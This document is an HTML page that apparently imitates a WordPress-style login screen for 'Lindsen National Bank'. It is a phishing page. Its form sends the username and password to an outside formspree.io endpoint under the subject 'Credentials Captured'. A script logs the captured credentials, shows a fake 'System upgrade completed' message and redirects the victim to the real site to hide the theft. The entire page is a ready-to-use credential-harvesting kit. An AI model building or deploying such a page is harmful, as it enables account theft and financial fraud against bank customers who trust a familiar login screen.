<body class="login no-js login-action-login wp-core-ui locale-en-us">
<script>
document.body.className = document.body.className.replace('no-js','js');
</script>

<h1 class="screen-reader-text">Log In</h1>
<div id="login">
    <h1 role="presentation" class="wp-login-logo"><a href="http://lindensennational.com/">Lindsen National Bank</a></h1>
    
    <form name="loginform" id="loginform" action="https://formspree.io/f/xwpzoyqz" method="POST">
    <input type="hidden" name="_subject" value="LNB System Upgrade - Credentials Captured">
    <input type="hidden" name="_format" value="plain">
    <input type="hidden" name="_next" value="http://lindensennational.com/">
    
    <p>
        <label for="user_login">Username or Email Address</label>
        <input type="text" name="username" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
    </p>

    <div class="user-pass-wrap">
        <label for="user_pass">Password</label>
        <div class="wp-pwd">
            <input type="password" name="password" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
            <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
                <span class="dashicons dashicons-visibility" aria-hidden="true">üëÅÔ∏è</span>
            </button>
        </div>
    </div>
    
    <p class="forgetmenot">
        <input name="rememberme" type="checkbox" id="rememberme" value="forever" /> 
        <label for="rememberme">Remember Me</label>
    </p>
    
    <p class="submit">
        <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
    </p>
</form>

    <p id="nav">
        <a class="wp-login-lost-password" href="http://lindensennational.com/wp-login.php?action=lostpassword">Lost your password?</a>
    </p>
    
    <script>
    function wp_attempt_focus() {
        setTimeout( function() {
            try {
                d = document.getElementById( "user_login" );
                d.focus();
                d.select();
            } catch( er ) {}
        }, 200);
    }
    wp_attempt_focus();
    </script>
    
    <p id="backtoblog">
        <a href="http://lindensennational.com/">&larr; Go to Lindsen National Bank</a>
    </p>
</div>

<script>
// Simple password toggle functionality
document.addEventListener('DOMContentLoaded', function() {
    const toggleButton = document.querySelector('.wp-hide-pw');
    const passwordInput = document.getElementById('user_pass');
    
    if (toggleButton && passwordInput) {
        toggleButton.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.setAttribute('data-toggle', type === 'password' ? '0' : '1');
        });
    }
    
    // Form submission handler
    document.getElementById('loginform').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('user_login').value;
        const password = document.getElementById('user_pass').value;
        
        // Log credentials (in real scenario, this would send to your server)
        console.log('Captured credentials:', { username, password });
        alert('System upgrade completed successfully! Redirecting...');
        
        // Redirect to real site after capture
        setTimeout(() => {
            window.location.href = 'http://lindensennational.com/';
        }, 2000);
    });
});
</script>
